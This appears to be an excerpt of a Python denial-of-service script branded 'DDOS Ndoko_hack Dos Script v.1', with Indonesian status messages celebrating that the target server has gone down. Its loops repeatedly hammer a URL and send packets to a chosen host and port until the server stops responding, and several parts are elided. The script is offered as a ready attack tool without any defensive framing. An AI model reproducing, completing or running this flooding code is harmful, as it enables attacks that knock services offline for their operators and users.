...
def bot_hammering(url):
	try:
		while True:
			...
			print("\033[94mNdoko_hack memukul target...\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)
	...
	try:
		while True:
			...
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--Ndoko_hack memukul target!--> \033[0m")
			else:
				s.shutdown(1)
				print("\033[91mBerhenti<->ah\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[91mServer tumbang! Ndoko_hack berhasil\033[0m")
...
def usage():
	...
	║  │ ││  │ │ ├─┤   ║║ ║║│ │╚═╗
	╩═╝└─┘└─┘┴ ┴ ┴ ┴  ═╩╝═╩╝└─┘╚═╝
	DDOS Ndoko_hack Dos Script v.1
...
if __name__ == '__main__':
	...
	print("\033[94mNdoko_hack melakukan Pengecekan...\033[0m")
	user_agent()
	my_bots()
	time.sleep(5)
	try:
